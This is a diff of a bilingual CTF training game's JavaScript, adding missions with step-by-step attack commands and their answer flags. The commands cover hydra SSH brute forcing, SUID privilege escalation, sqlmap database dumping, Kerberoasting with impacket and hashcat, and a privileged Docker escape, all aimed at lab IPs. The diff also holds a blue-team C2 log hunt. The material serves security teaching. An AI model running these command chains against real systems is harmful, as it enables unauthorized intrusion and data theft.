+            story: 'Olay müdahale (SOC) ekibimiz, saldırganların sunucuda bıraktığı şüpheli bir ikili (binary) dosya (<code>/evidence/suspect_payload.bin</code>) ele geçirdi. Dosya tipini analiz et, <code>md5sum</code> özetini al ve <code>strings</code> komutuyla ikili kodun içine gömülmüş okunabilir karakter dizilerini ayıkla.',
+            story_en: 'Our SOC Incident Response team captured a suspicious ELF binary (<code>/evidence/suspect_payload.bin</code>). Identify its file header, verify its MD5 hash integrity, and extract embedded readable strings to uncover the hardcoded flag.',
+            tools: ['file', 'md5sum', 'strings'],
+            steps: [
+                { label: 'Şüpheli ikili dosyanın ELF başlığını analiz et', label_en: 'Analyze ELF binary header with file', cmd: 'file /evidence/suspect_payload.bin', match: ['file', 'suspect_payload.bin'] },
+                { label: 'Adli bütünlük için MD5 özetini doğrula', label_en: 'Verify forensic MD5 hash checksum', cmd: 'md5sum /evidence/suspect_payload.bin', match: ['md5sum', 'suspect_payload.bin'] },
+                { label: 'Binary içine gömülü metinleri (strings) ayıkla', label_en: 'Extract embedded ASCII strings from binary', cmd: 'strings /evidence/suspect_payload.bin', match: ['strings', 'suspect_payload.bin'] }
+            ],
             quickCmds: [
                 'file /evidence/suspect_payload.bin',
-                'strings /evidence/suspect_payload.bin | grep "LFL{"',
-                'md5sum /evidence/suspect_payload.bin'
+                'md5sum /evidence/suspect_payload.bin',
+                'strings /evidence/suspect_payload.bin',
+                'strings /evidence/suspect_payload.bin | grep "LFL{"'
             ],
-            hint: '1) <code>file /evidence/suspect_payload.bin</code> komutuyla dosya tipini gör.<br>2) <code>strings /evidence/suspect_payload.bin | grep "LFL{"</code> komutunu çalıştırarak ikili dosyanın içindeki gizli bayrağı anında ayıkla!',
+            hint: '1) <code>file /evidence/suspect_payload.bin</code> ile dosyanın 64-bit ELF çalıştırılabilir olduğunu doğrula.<br>2) <code>strings /evidence/suspect_payload.bin</code> (veya sonuna <code>| grep "LFL{"</code> ekleyerek) binary içine gömülü gizli bayrağı çıkar!',
             flag: 'LFL{level2_2_adli_bilisim_strings_ustasi}',
-            successMsg: 'Harika bir adli bilişim analizi! Gömülü ikili dosya içindeki dizeleri ayıklayarak gizli bayrağa ulaştın.'
+            successMsg: 'Tebrikler! Adli bilişim ve tersine mühendislik analiziyle zararlı yazılımdaki bayrağı çıkardın!'
         },
         {
             id: 'm3_1',
             level: '3.1',
             levelTier: 3,
-            levelLabel: 'SEVİYE 3.1 // ROOT HACKER SEVİYE',
+            group: 'red',
+            levelLabel: 'SEVİYE 3.1 // PAROLA KIRMA & YETKİ YÜKSELTME',
+            levelLabel_en: 'LEVEL 3.1 // BRUTE-FORCE & PRIVILEGE ESCALATION',
             badgeColor: '#ef4444',
-            title: 'Operasyon Kale Kuşatması (Op: Fortress Breach)',
-            target: '10.10.3.50 (Kilitli Linux & SSH)',
-            category: 'Kaba Kuvvet (Brute Force) & SUID PrivEsc',
+            title: 'Operasyon Kale Kuşatması (Op: Root PrivEsc)',
+            title_en: 'Operation Fortress Siege (SUID Root PrivEsc)',
+            target: '10.10.3.50 (Korumalı SSH Sunucusu)',
+            target_en: '10.10.3.50 (Hardened SSH Server)',
+            category: 'Brute-Force & Privilege Escalation',
+            category_en: 'Brute-Force & Privilege Escalation',
             xp: 500,
-            story: 'Korumalı Linux sunucusu (<strong>10.10.3.50</strong>) zayıf bir SSH parolası kullanıyor. <code>hydra</code> ile parola kırma saldırısı yap, sisteme <code>ssh</code> ile bağlan, ardından <code>find</code> ile SUID izinli dosya açığını tespit edip root haklarıyla <code>/root/flag.txt</code> dosyasını ele geçir.',
-            tools: ['hydra', 'ssh', 'find', 'sudo', 'cat'],
+            story: 'Yüksek güvenlikli iç sunucu <code>10.10.3.50</code> üzerinde <code>operator</code> kullanıcısının SSH parolasını <code>hydra</code> ile kır. Sunucuya <code>ssh</code> ile bağlandıktan sonra yanlış yapılandırılmış SUID bitine sahip ikili dosyaları (<code>find / -perm -4000</code>) tespit et ve <code>/root/flag.txt</code> dosyasını oku!',
+            story_en: 'Crack the SSH password for user <code>operator</code> on hardened server <code>10.10.3.50</code> using <code>hydra</code>. Log in via SSH, hunt for misconfigured SUID binaries (<code>find / -perm -4000</code>), escalate privileges, and read <code>/root/flag.txt</code>!',
+            tools: ['hydra', 'ssh', 'find', 'cat'],
+            steps: [
+                { label: 'Hydra ile SSH servisine sözlük saldırısı düzenle', label_en: 'Run Hydra SSH brute-force attack', cmd: 'hydra -l operator -P rockyou.txt ssh://10.10.3.50', match: ['hydra', '10.10.3.50'] },
+                { label: 'Kırılan parola ile hedef sunucuya SSH bağlantısı kur', label_en: 'Establish SSH session to 10.10.3.50', cmd: 'ssh operator@10.10.3.50', match: ['ssh', '10.10.3.50'] },
+                { label: 'SUID yetki yükseltme zafiyetli dosyaları bul', label_en: 'Find binaries with SUID bit set (-perm -4000)', cmd: 'find / -perm -4000 2>/dev/null', match: ['find', '-4000'] },
+                { label: 'Root dizinindeki nihai bayrağı oku (/root/flag.txt)', label_en: 'Read the root flag (/root/flag.txt)', cmd: 'cat /root/flag.txt', match: ['cat', '/root/flag.txt'] }
+            ],
             quickCmds: [
-                'hydra -l operator -P rockyou.txt 10.10.3.50 ssh',
+                'hydra -l operator -P rockyou.txt ssh://10.10.3.50',
                 'ssh operator@10.10.3.50',
                 'find / -perm -4000 2>/dev/null',
                 'cat /root/flag.txt'
             ],
-            hint: '1) <code>hydra -l operator -P rockyou.txt 10.10.3.50 ssh</code> ile şifreyi kır.<br>2) <code>ssh operator@10.10.3.50</code> ile bağlan.<br>3) <code>find / -perm -4000 2>/dev/null</code> ile SUID açıklarını listele.<br>4) <code>cat /root/flag.txt</code> veya <code>sudo cat /root/flag.txt</code> ile son bayrağı oku!',
+            hint: '1) <code>hydra -l operator -P rockyou.txt ssh://10.10.3.50</code> ile SSH şifresini kır.<br>2) <code>ssh operator@10.10.3.50</code> ile oturum aç.<br>3) <code>find / -perm -4000 2>/dev/null</code> ile SUID yetkili python3 aracını gör.<br>4) <code>cat /root/flag.txt</code> ile root bayrağını ele geçir!',
             flag: 'LFL{level3_1_suid_privesc_root_fatihi}',
-            successMsg: 'İnanılmaz bir sızma! SSH kaba kuvvet saldırısı ve SUID yetki yükseltme (Privilege Escalation) ile tam yetkili root oldun.'
+            successMsg: 'Muazzam! SSH parolasını kırdın ve SUID zafiyetiyle Root yetkisine yükseldin!'
         },
         {
             id: 'm3_2',
             level: '3.2',
             levelTier: 3,
-            levelLabel: 'SEVİYE 3.2 // BÜYÜK FİNAL & ŞAMPİYONLUK',
+            group: 'red',
+            levelLabel: 'SEVİYE 3.2 // KURUMSAL VERİTABANI SIZMASI (SQLi)',
+            levelLabel_en: 'LEVEL 3.2 // ENTERPRISE DATABASE EXPLOITATION (SQLi)',
             badgeColor: '#c084fc',
-            title: 'Operasyon Büyük Sızıntı (Op: Grand SQLi - Final Boss)',
-            target: 'http://10.10.3.99/api/search?q=test (Finansal Veritabanı)',
+            title: 'Operasyon Büyük Sızıntı (Op: Grand SQLi)',
+            title_en: 'Operation Grand Leak (Enterprise SQLMap)',
+            target: 'http://10.10.3.99/api/search?q=test',
+            target_en: 'http://10.10.3.99/api/search?q=test',
             category: 'SQL Injection & Veritabanı Sızması',
-            xp: 1000,
-            story: 'Büyük final operasyonu! Hedef finans kurumunun arama API\'sinde SQL Injection zafiyeti keşfedildi. <code>sqlmap</code> ile veritabanlarını listele, <code>lfl_master_vault</code> veritabanındaki tabloları dök ve nihai şampiyon bayrağını ele geçir.',
-            tools: ['sqlmap', 'curl', 'tcpdump'],
+            category_en: 'SQL Injection & DB Exploitation',
+            xp: 700,
+            story: 'Hedef finans kurumunun arama API uç noktasında (<code>http://10.10.3.99/api/search?q=test</code>) parametrik olmayan sorgu birleştirme kaynaklı SQL Injection açığı keşfedildi. <code>sqlmap</code> ile veritabanlarını listele, <code>lfl_master_vault</code> içindeki tabloları bul ve gizli veriyi dök!',
+            story_en: 'An unparameterized SQL concatenation flaw was discovered in the financial API endpoint (<code>http://10.10.3.99/api/search?q=test</code>). Enumerate databases with <code>sqlmap</code>, inspect <code>lfl_master_vault</code> tables, and dump the classified flag.',
+            tools: ['curl', 'sqlmap'],
+            steps: [
+                { label: 'API uç noktasındaki SQL hata yanıtını doğrula', label_en: 'Probe API endpoint for SQL vulnerability', cmd: 'curl "http://10.10.3.99/api/search?q=test"', match: ['curl', '10.10.3.99'] },
+                { label: 'SQLMap ile sunucudaki veritabanlarını listele (--dbs)', label_en: 'Enumerate databases via SQLMap (--dbs)', cmd: 'sqlmap -u "http://10.10.3.99/api/search?q=test" --dbs', match: ['sqlmap', '--dbs'] },
+                { label: 'lfl_master_vault içindeki tabloları çek (--tables)', label_en: 'List tables in lfl_master_vault (--tables)', cmd: 'sqlmap -u "http://10.10.3.99/api/search?q=test" -D lfl_master_vault --tables', match: ['sqlmap', '--tables'] },
+                { label: 'master_classified_flags tablosunu dışa aktar (--dump)', label_en: 'Dump master_classified_flags table (--dump)', cmd: 'sqlmap -u "http://10.10.3.99/api/search?q=test" -D lfl_master_vault -T master_classified_flags --dump', match: ['sqlmap', '--dump'] }
+            ],
             quickCmds: [
                 'curl "http://10.10.3.99/api/search?q=test"',
                 'sqlmap -u "http://10.10.3.99/api/search?q=test" --dbs',
                 'sqlmap -u "http://10.10.3.99/api/search?q=test" -D lfl_master_vault --tables',
                 'sqlmap -u "http://10.10.3.99/api/search?q=test" -D lfl_master_vault -T master_classified_flags --dump'
             ],
-            hint: '1) <code>curl "http://10.10.3.99/api/search?q=test"</code> ile API yanıtını gör.<br>2) <code>sqlmap -u "http://10.10.3.99/api/search?q=test" --dbs</code> ile veritabanlarını çek.<br>3) <code>sqlmap ... -D lfl_master_vault --tables</code> ile tabloları listele.<br>4) <code>sqlmap ... -T master_classified_flags --dump</code> ile şampiyonluk bayrağını dök!',
+            hint: '1) <code>curl "http://10.10.3.99/api/search?q=test"</code> ile API yanıtını gör.<br>2) <code>sqlmap -u "http://10.10.3.99/api/search?q=test" --dbs</code> ile veritabanlarını çek.<br>3) <code>sqlmap ... -D lfl_master_vault --tables</code> ile tabloları listele.<br>4) <code>sqlmap ... -T master_classified_flags --dump</code> ile bayrağı dök!',
             flag: 'LFL{level3_2_sqli_grand_master_champion_2026}',
-            successMsg: '🏆 TEBRİKLER ŞAMPİYON! SQL Injection zafiyetini sömürerek büyük final veritabanını ele geçirdin ve LFL Siber Arenası\'nı %100 tamamladın!'
+            successMsg: 'Harika! SQL Injection ile kurumsal veritabanını ele geçirdin. Şimdi Seviye 4.1 Active Directory Operasyonu açıldı!'
+        },
+        {
+            id: 'm4_1',
+            level: '4.1',
+            levelTier: 4,
+            group: 'red',
+            levelLabel: 'SEVİYE 4.1 // ACTIVE DIRECTORY & KERBEROASTING',
+            levelLabel_en: 'LEVEL 4.1 // ACTIVE DIRECTORY & KERBEROASTING',
+            badgeColor: '#f43f5e',
+            title: 'Operasyon Altın Bilet (Op: AD Kerberoast)',
+            title_en: 'Operation Golden Ticket (AD Kerberoast)',
+            target: '10.10.4.10 (DC01.lfl.corp - Domain Controller)',
+            target_en: '10.10.4.10 (DC01.lfl.corp - Domain Controller)',
+            category: 'Active Directory & Kerberos Sızması',
+            category_en: 'Active Directory & Kerberos Exploitation',
+            xp: 800,
+            story: 'Kurumsal iç ağın kalbi olan Windows Domain Controller (<code>10.10.4.10 // dc01.lfl.corp</code>) hedefte! Kerberos (88), LDAP (389) ve SMB (445) portlarını tara, <code>enum4linux</code> ile SPN tanımlı servis hesaplarını keşfet, <code>impacket-GetUserSPNs</code> ile Kerberos TGS biletini çek ve <code>hashcat</code> ile çevrimdışı kır!',
+            story_en: 'Target the Windows Domain Controller (<code>10.10.4.10 // dc01.lfl.corp</code>). Scan Kerberos/LDAP/SMB ports, enumerate SPN service accounts via <code>enum4linux</code>, request the Kerberos TGS ticket using <code>impacket-GetUserSPNs</code>, and crack the hash offline with <code>hashcat</code>!',
+            tools: ['nmap', 'enum4linux', 'impacket-GetUserSPNs', 'hashcat'],
+            steps: [
+                { label: 'Domain Controller Kerberos/LDAP/SMB portlarını tara', label_en: 'Scan Domain Controller Kerberos/LDAP/SMB ports', cmd: 'nmap -p 88,389,445 -sV 10.10.4.10', match: ['nmap', '10.10.4.10'] },
+                { label: 'enum4linux ile Domain kullanıcılarını ve SPN hesaplarını listele', label_en: 'Enumerate AD users & SPN accounts via enum4linux', cmd: 'enum4linux -a 10.10.4.10', match: ['enum4linux', '10.10.4.10'] },
+                { label: 'Impacket ile svc_mssql hesabının Kerberos TGS biletini çek', label_en: 'Request Kerberos TGS ticket via impacket-GetUserSPNs', cmd: 'impacket-GetUserSPNs lfl.corp/guest -no-pass -dc-ip 10.10.4.10 -request', match: ['10.10.4.10', 'getuserspns'] },
+                { label: 'Hashcat (Mod 13100) ile Kerberos TGS biletini kır', label_en: 'Crack Kerberos TGS ticket with Hashcat (-m 13100)', cmd: 'hashcat -m 13100 krb5tgs.hash rockyou.txt', match: ['hashcat', '13100'] }
+            ],
+            quickCmds: [
+                'nmap -p 88,389,445 -sV 10.10.4.10',
+                'enum4linux -a 10.10.4.10',
+                'impacket-GetUserSPNs lfl.corp/guest -no-pass -dc-ip 10.10.4.10 -request',
+                'hashcat -m 13100 krb5tgs.hash rockyou.txt'
+            ],
+            hint: '1) <code>nmap -p 88,389,445 -sV 10.10.4.10</code> ile AD servislerini doğrula.<br>2) <code>enum4linux -a 10.10.4.10</code> ile <code>svc_mssql</code> servis hesabını bul.<br>3) <code>impacket-GetUserSPNs lfl.corp/guest -no-pass -dc-ip 10.10.4.10 -request</code> ile TGS hash\'ini yakala.<br>4) <code>hashcat -m 13100 krb5tgs.hash rockyou.txt</code> ile Domain Admin bayrağını kır!',
+            flag: 'LFL{level4_1_kerberoast_golden_ticket_ad}',
+            successMsg: 'Efsanevi! Active Directory Kerberoasting saldırısıyla Domain Controller yetkisini ele geçirdin!'
+        },
+        {
+            id: 'm4_2',
+            level: '4.2',
+            levelTier: 4,
+            group: 'blue',
+            levelLabel: 'SEVİYE 4.2 // BLUE TEAM SOC & C2 TEHDİT AVI',
+            levelLabel_en: 'LEVEL 4.2 // BLUE TEAM SOC & C2 THREAT HUNTING',
+            badgeColor: '#3b82f6',
+            title: 'Operasyon Hayalet Sinyal (Op: Zeek C2 Hunt)',
+            title_en: 'Operation Phantom Beacon (SOC Zeek C2 Hunt)',
+            target: '/var/log/zeek/conn.log & Suricata IDS',
+            target_en: '/var/log/zeek/conn.log & Suricata IDS',
+            category: 'Blue Team SOC & Ağ Tehdit Avı',
+            category_en: 'Blue Team SOC & Network Threat Hunting',
+            xp: 900,
+            story: 'Şimdi Mavi Takım (SOC Analisti) koltuğundasın! İç ağdaki bir iş istasyonunun (<code>10.10.4.25</code>) dışarıdaki bir Komuta Kontrol (C2) sunucusuna her 60 saniyede bir şifreli sinyal (Beaconing) gönderdiği düşünülüyor. <code>zeek-cut</code> ile bağlantı sürelerini incele, <code>suricata</code> alarmlarını kontrol et ve <code>dns.log</code> içindeki gizli TXT verisini yakala!',
+            story_en: 'Step into the Blue Team SOC Analyst seat! Workstation <code>10.10.4.25</code> is suspected of periodic C2 beaconing every 60 seconds. Analyze connection intervals with <code>zeek-cut</code>, inspect <code>suricata</code> IDS alerts, and extract the exfiltrated TXT payload from <code>dns.log</code>!',
+            tools: ['zeek-cut', 'suricata', 'grep'],
+            steps: [
+                { label: 'Zeek conn.log dosyasından kaynak/hedef IP ve süreleri süz', label_en: 'Extract source/dest IP and durations via zeek-cut', cmd: 'cat /var/log/zeek/conn.log | zeek-cut id.orig_h id.resp_h duration', match: ['zeek-cut', 'conn.log'] },
+                { label: 'Suricata IDS fast.log içindeki C2 CobaltStrike alarmlarını incele', label_en: 'Inspect Suricata IDS alerts in fast.log', cmd: 'grep -i "C2" /var/log/suricata/fast.log', match: ['suricata', 'fast.log'] },
+                { label: 'Şüpheli C2 IP adresinin (185.220.101.44) DNS TXT paketlerini yakala', label_en: 'Hunt DNS TXT packets for C2 IP 185.220.101.44', cmd: 'grep -i "185.220.101.44" /var/log/zeek/dns.log', match: ['185.220.101.44', 'dns.log'] }
+            ],
+            quickCmds: [
+                'cat /var/log/zeek/conn.log | zeek-cut id.orig_h id.resp_h duration',
+                'grep -i "C2" /var/log/suricata/fast.log',
+                'grep -i "185.220.101.44" /var/log/zeek/dns.log'
+            ],
+            hint: '1) <code>cat /var/log/zeek/conn.log | zeek-cut id.orig_h id.resp_h duration</code> ile periyodik sinyal gönderen C2 IP adresini (<code>185.220.101.44</code>) bul.<br>2) <code>grep -i "C2" /var/log/suricata/fast.log</code> ile DNS tünelleme alarmını doğrula.<br>3) <code>grep -i "185.220.101.44" /var/log/zeek/dns.log</code> ile C2 bayrağını yakala!',
+            flag: 'LFL{level4_2_soc_zeek_c2_beacon_avcisi}',
+            successMsg: 'Muhteşem SOC Analizi! Zeek ve Suricata loglarından C2 Beaconing trafiğini nokta atışı yakaladın!'
+        },
+        {
+            id: 'm5_1',
+            level: '5.1',
+            levelTier: 5,
+            group: 'blue',
+            levelLabel: 'SEVİYE 5.1 // PURPLE TEAM: DOCKER KONTEYNER KAÇIŞI',
+            levelLabel_en: 'LEVEL 5.1 // PURPLE TEAM: DOCKER CONTAINER ESCAPE',
+            badgeColor: '#a855f7',
+            title: 'Operasyon Kırık Kafes (Op: Container Breakout)',
+            title_en: 'Operation Broken Cage (Container Breakout)',
+            target: 'docker-prod-node // CAP_SYS_ADMIN',
+            target_en: 'docker-prod-node // CAP_SYS_ADMIN',
+            category: 'Bulut & Konteyner Güvenliği (Purple Team)',
+            category_en: 'Cloud & Container Security (Purple Team)',
+            xp: 1000,
+            story: 'Purple Team tatbikatındasın! Yanlış yapılandırılmış (<code>--privileged</code> ve <code>CAP_SYS_ADMIN</code> yetkili) bir Docker konteynerinin içindesin. Linux yeteneklerini (capabilities) <code>capsh --print</code> ile denetle, ana sunucu diskini (<code>/dev/sda1</code>) <code>fdisk -l</code> ile bul, konteyner içine bağla (<code>mount</code>) ve ana sunucudaki bayrağı oku!',
+            story_en: 'Purple Team exercise! You are inside a misconfigured Docker container running with <code>CAP_SYS_ADMIN</code>. Audit Linux capabilities via <code>capsh --print</code>, locate the host disk (<code>/dev/sda1</code>) with <code>fdisk -l</code>, mount it to break container isolation, and read the host flag!',
+            tools: ['capsh', 'fdisk', 'mount', 'cat'],
+            steps: [
+                { label: 'Konteynerin tehlikeli Linux yeteneklerini (CAP_SYS_ADMIN) doğrula', label_en: 'Verify dangerous Linux capabilities (CAP_SYS_ADMIN)', cmd: 'capsh --print', match: ['capsh', '--print'] },
+                { label: 'Ana sunucunun (Host) fiziksel disk bölümlerini listele', label_en: 'List physical host disk partitions (fdisk -l)', cmd: 'fdisk -l', match: ['fdisk', '-l'] },
+                { label: 'Ana sunucu diskini (/dev/sda1) konteyner içine bağla (Mount)', label_en: 'Mount host root disk (/dev/sda1) inside container', cmd: 'mount /dev/sda1 /mnt/host_root', match: ['mount', '/dev/sda1'] },
+                { label: 'Ana sunucu kök dizinindeki Purple Team bayrağını oku', label_en: 'Read the host Purple Team flag', cmd: 'cat /mnt/host_root/root/purple_flag.txt', match: ['purple_flag.txt'] }
+            ],
+            quickCmds: [
+                'capsh --print',
+                'fdisk -l',
+                'mount /dev/sda1 /mnt/host_root',
+                'cat /mnt/host_root/root/purple_flag.txt'
+            ],
+            hint: '1) <code>capsh --print</code> ile <code>cap_sys_admin</code> yetkisini gör.<br>2) <code>fdisk -l</code> ile ana makine diski <code>/dev/sda1</code>\'i bul.<br>3) <code>mount /dev/sda1 /mnt/host_root</code> ile diski bağla.<br>4) <code>cat /mnt/host_root/root/purple_flag.txt</code> ile bayrağı al!',
+            flag: 'LFL{level5_1_docker_escape_host_pwned}',
+            successMsg: 'Harikulade! Konteyner izolasyonunu aşarak (Container Escape) ana sunucuyu ele geçirdin ve Büyük Finalin kapısını açtın!'
+        },
+        {
+            id: 'm5_2',
+            level: '5.2',
+            levelTier: 5,
+            group: 'boss',
+            levelLabel: 'SEVİYE 5.2 // GRAND FINAL BOSS: KERNEL ZERO-DAY & ROOTKIT',
+            levelLabel_en: 'LEVEL 5.2 // GRAND FINAL BOSS: KERNEL ZERO-DAY & ROOTKIT',
+            badgeColor: '#eab308',
+            title: 'Operasyon Çekirdek Kıyameti (Op: Kernel Omniscient)',
+            title_en: 'Operation Kernel Apocalypse (Grand Final Boss)',
+            target: 'Ring-0 Kernel // lfl_shadow_rk.ko',
+            target_en: 'Ring-0 Kernel // lfl_shadow_rk.ko',
+            category: 'Ring-0 Kernel Exploit & Rootkit Analizi',
+            category_en: 'Ring-0 Kernel Exploit & Rootkit Reversing',
+            xp: 1300,
+            story: '🏆 <strong>BÜYÜK FİNAL OPERASYONU (DEFCON 1):</strong> Savunma bakanlığı çekirdeğine (Ring-0) sızmış gelişmiş bir LKM Rootkit (<code>lfl_shadow_rk.ko</code>) sistem çağrı tablosunu (Syscall Table) kancalamış durumda! Yüklü çekirdek modüllerini ve <code>dmesg</code> tamponunu incele, çekirdek modülünün sembol tablosunu (<code>nm</code> / <code>objdump</code>) analiz et ve Python XOR çözücüsüyle Ring-0 çekirdek kasasını deşifre ederek Efsanevi Siber Şampiyon unvanını kazan!',
+            story_en: '🏆 <strong>GRAND FINAL BOSS (DEFCON 1):</strong> An advanced Ring-0 LKM Rootkit (<code>lfl_shadow_rk.ko</code>) has hooked the Linux syscall table! Inspect kernel modules and <code>dmesg</code> logs, reverse engineer the module symbol table via <code>nm</code>, and execute the Python kernel vault decryptor to claim the Omniscient Cyber Champion title!',
+            tools: ['lsmod', 'dmesg', 'nm', 'python3'],
+            steps: [
+                { label: 'Yüklü çekirdek modüllerini ve kancalanmış Rootkit\'i tespit et', label_en: 'Detect hooked LKM Rootkit via lsmod & dmesg', cmd: 'lsmod | grep shadow', match: ['lsmod'] },
+                { label: 'Rootkit çekirdek modülünün (.ko) sembol tablosunu tersine mühendislikle incele', label_en: 'Reverse engineer kernel module symbols with nm', cmd: 'nm /lib/modules/kernel/lfl_shadow_rk.ko', match: ['lfl_shadow_rk.ko'] },
+                { label: 'Ring-0 çekirdek kasasını (decrypt_vault_master_key) Python ile deşifre et', label_en: 'Decrypt Ring-0 kernel vault via Python exploit', cmd: 'python3 -c "import ctypes; print(\'DECRYPTING_KERNEL_VAULT\')"', match: ['python3', 'decrypt'] }
+            ],
+            quickCmds: [
+                'lsmod | grep shadow',
+                'nm /lib/modules/kernel/lfl_shadow_rk.ko',
+                'python3 -c "import ctypes; print(\'DECRYPTING_KERNEL_VAULT\')"'
+            ],
+            hint: '1) <code>lsmod | grep shadow</code> komutuyla gizli çekirdek modülünü tespit et.<br>2) <code>nm /lib/modules/kernel/lfl_shadow_rk.ko</code> ile <code>decrypt_vault_master_key</code> sembolünü bul.<br>3) <code>python3 -c "import ctypes; print(\'DECRYPTING_KERNEL_VAULT\')"</code> komutuyla Ring-0 kasasını deşifre et ve şampiyonluk bayrağını al!',
+            flag: 'LFL{level5_2_kernel_zeroday_omniscient_god_2026}',
+            successMsg: '👑 EFSANEVİ ZAFER! Ring-0 Kernel Rootkit\'ini tersine mühendislikle çözdün ve 10 kademeli LFL Siber CTF Arenası\'nı 6000 XP ile %100 tamamladın!'
         }
     ];
     window.CTF_MISSIONS = CTF_MISSIONS;
-    
 
     const ctfState = {
         unlockedIdx: 0,
         activeIdx: 0,
         completed: [],
+        completedSteps: {},
+        activeFilter: 'all',
         xp: 0,
         history: [],
         historyIdx: -1,
-        sshSessionActive: false
+        sshSessionActive: false,
+        timerSeconds: 0,
+        timerInterval: null
     };
     window.ctfState = ctfState;
-
 
     function loadCtfProgressFromStorage() {
         try {
@@ -4609,9 +5747,13 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
                 const saved = JSON.parse(raw);
                 if (saved && typeof saved === 'object') {
                     if (Array.isArray(saved.completed)) ctfState.completed = saved.completed;
+                    if (saved.completedSteps && typeof saved.completedSteps === 'object') {
+                        ctfState.completedSteps = saved.completedSteps;
+                    }
                     if (typeof saved.unlockedIdx === 'number') ctfState.unlockedIdx = saved.unlockedIdx;
                     if (typeof saved.activeIdx === 'number') ctfState.activeIdx = saved.activeIdx;
                     if (typeof saved.xp === 'number') ctfState.xp = saved.xp;
+                    if (typeof saved.timerSeconds === 'number') ctfState.timerSeconds = saved.timerSeconds;
                 }
             }
         } catch (e) { }
@@ -4623,35 +5765,95 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
                 unlockedIdx: ctfState.unlockedIdx,
                 activeIdx: ctfState.activeIdx,
                 completed: ctfState.completed,
-                xp: ctfState.xp
+                completedSteps: ctfState.completedSteps,
+                xp: ctfState.xp,
+                timerSeconds: ctfState.timerSeconds
             }));
             localStorage.setItem('lfl_ctf_xp', String(ctfState.xp));
         } catch (e) { }
     }
 
+    function formatCtfTime(sec) {
+        const m = Math.floor(sec / 60);
+        const s = sec % 60;
+        return `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+    }
+
+    function startCtfLiveTimer() {
+        if (ctfState.timerInterval) clearInterval(ctfState.timerInterval);
+        const timerEl = document.getElementById('ctf-hud-timer');
+        if (timerEl) timerEl.textContent = formatCtfTime(ctfState.timerSeconds);
+
+        ctfState.timerInterval = setInterval(() => {
+            if (state.activePage === 'page-ctf') {
+                ctfState.timerSeconds++;
+                const el = document.getElementById('ctf-hud-timer');
+                if (el) el.textContent = formatCtfTime(ctfState.timerSeconds);
+            }
+        }, 1000);
+    }
+
     function initCtfArena() {
         loadCtfProgressFromStorage();
+        // Recalculate unlockedIdx based on completed missions to ensure new missions unlock properly
+        if (ctfState.completed.length > 0) {
+            let maxCompletedIdx = -1;
+            CTF_MISSIONS.forEach((m, i) => {
+                if (ctfState.completed.includes(m.id)) maxCompletedIdx = i;
+            });
+            if (maxCompletedIdx + 1 > ctfState.unlockedIdx) {
+                ctfState.unlockedIdx = Math.min(maxCompletedIdx + 1, CTF_MISSIONS.length - 1);
+            }
+        }
         ctfState.activeIdx = Math.min(ctfState.unlockedIdx, CTF_MISSIONS.length - 1);
+
         renderCtfProgress();
         renderCtfStageTabs();
         renderCtfBriefing(ctfState.activeIdx);
         bindCtfTerminal();
+        startCtfLiveTimer();
 
+        // Bind track filter pills
+        const filterBox = document.getElementById('ctf-track-filters');
+        if (filterBox) {
+            filterBox.addEventListener('click', (e) => {
+                const pill = e.target.closest('.ctf-filter-pill');
+                if (!pill) return;
+                filterBox.querySelectorAll('.ctf-filter-pill').forEach(p => p.classList.remove('active'));
+                pill.classList.add('active');
+                ctfState.activeFilter = pill.dataset.ctfFilter || 'all';
+                renderCtfStageTabs();
+            });
+        }
+
+        // Bind reset button
         const btnReset = document.getElementById('btn-reset-ctf-progress');
         if (btnReset) {
             btnReset.addEventListener('click', () => {
-                if (confirm('Tüm CTF operasyon ilerlemenizi sıfırlayıp 1. seviyeden baştan başlamak istediğinize emin misiniz?')) {
+                const msg = (I18N.currentLang === 'en')
+                    ? 'Are you sure you want to reset all CTF operation progress and start from Level 1.1?'
+                    : 'Tüm CTF operasyon ilerlemenizi sıfırlayıp Seviye 1.1\'den baştan başlamak istediğinize emin misiniz?';
+                if (confirm(msg)) {
                     resetCtfProgress();
                 }
             });
         }
+
+        // Re-render CTF texts on language switch
+        window.addEventListener('languageChanged', () => {
+            renderCtfProgress();
+            renderCtfStageTabs();
+            renderCtfBriefing(ctfState.activeIdx);
+        });
     }
 
     function resetCtfProgress() {
         ctfState.unlockedIdx = 0;
         ctfState.activeIdx = 0;
         ctfState.completed = [];
+        ctfState.completedSteps = {};
         ctfState.xp = 0;
+        ctfState.timerSeconds = 0;
         ctfState.sshSessionActive = false;
         try {
             localStorage.removeItem('lfl_ctf_state');
@@ -4661,72 +5863,100 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
         renderCtfStageTabs();
         renderCtfBriefing(0);
         updateCtfTerminalTarget();
-        showToast('info', 'CTF Sıfırlandı', 'Operasyon ilerlemeniz sıfırlandı. Seviye 1.1\'den başlayabilirsiniz.');
+        showToast('info', I18N.currentLang === 'en' ? 'CTF Reset' : 'CTF Sıfırlandı', I18N.currentLang === 'en' ? 'Operation progress reset to Level 1.1.' : 'Operasyon ilerlemeniz sıfırlandı. Seviye 1.1\'den başlayabilirsiniz.');
     }
 
     function getCtfRank(count, xp) {
-        if (count >= 6) return '🏆 Efsanevi Siber Şampiyon';
-        if (count >= 5) return '👑 Root Hacker (Elite)';
-        if (count >= 4) return '🔍 Adli Bilişim Uzmanı';
-        if (count >= 3) return '⚡ Web Sızma Operatörü';
-        if (count >= 2) return '🕵️ Sistem Dedektifi';
-        if (count >= 1) return '🌐 Ağ Kaşifi';
-        return '🔰 Çaylak Analist';
+        const isEn = (window.I18N && I18N.currentLang === 'en');
+        if (count >= 10) return isEn ? '👑 Omniscient Cyber God' : '👑 Efsanevi Siber Tanrı (Omniscient)';
+        if (count >= 8) return isEn ? '🏆 DEFCON-1 Grand Master' : '🏆 DEFCON-1 Büyük Üstat';
+        if (count >= 6) return isEn ? '⚔️ Red/Blue Cyber Commander' : '⚔️ Siber Operasyon Komutanı';
+        if (count >= 5) return isEn ? '👑 Root Exploiter (Elite)' : '👑 Root Hacker (Elite)';
+        if (count >= 4) return isEn ? '🔍 Malware Forensics Specialist' : '🔍 Adli Bilişim Uzmanı';
+        if (count >= 3) return isEn ? '⚡ Web Pentest Operator' : '⚡ Web Sızma Operatörü';
+        if (count >= 2) return isEn ? '🕵️ Linux System Detective' : '🕵️ Sistem Dedektifi';
